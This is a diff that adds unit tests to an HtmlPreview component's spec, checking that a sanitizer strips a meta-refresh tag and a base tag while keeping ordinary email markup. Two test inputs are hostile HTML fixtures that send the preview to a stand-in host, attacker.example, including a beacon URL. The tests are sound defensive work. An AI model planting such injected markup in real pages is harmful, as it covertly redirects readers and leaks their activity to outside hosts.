@@ -35,4 +35,32 @@ describe('HtmlPreview', () => {
     const doc = iframe.getAttribute('srcdoc') as string;
     expect(doc).toContain('img-src data: https: http:');
   });
+
+  it('strips a meta-refresh navigation even though it is neither a script nor blocked by CSP', () => {
+    // CSP fetch directives don't govern navigation, and the sandbox's navigation
+    // restriction only applies to *other* browsing contexts, not the iframe's own
+    // content — so a bare `sandbox=""` + `default-src 'none'` does not stop this.
+    const html = '<h1>Hi</h1><meta http-equiv="refresh" content="0;url=https://attacker.example/beacon?x=1">';
+    const iframe = render(html).nativeElement.querySelector('iframe');
+    const doc = iframe.getAttribute('srcdoc') as string;
+    expect(doc).not.toContain('http-equiv="refresh"');
+    expect(doc).not.toContain('attacker.example');
+  });
+
+  it('strips a base tag that could redirect relative links and image loads', () => {
+    const html = '<base href="https://attacker.example/"><h1>Hi</h1>';
+    const iframe = render(html).nativeElement.querySelector('iframe');
+    const doc = iframe.getAttribute('srcdoc') as string;
+    expect(doc).not.toContain('<base');
+    expect(doc).not.toContain('attacker.example');
+  });
+
+  it('leaves ordinary email markup — headings, inline styles, images — intact', () => {
+    const html = '<h1>Hi</h1><p style="color:red">Text</p><img src="https://tracker.example/p.gif">';
+    const iframe = render(html).nativeElement.querySelector('iframe');
+    const doc = iframe.getAttribute('srcdoc') as string;
+    expect(doc).toContain('<h1>Hi</h1>');
+    expect(doc).toContain('<p style="color:red">Text</p>');
+    expect(doc).toContain('<img src="https://tracker.example/p.gif">');
+  });
 });
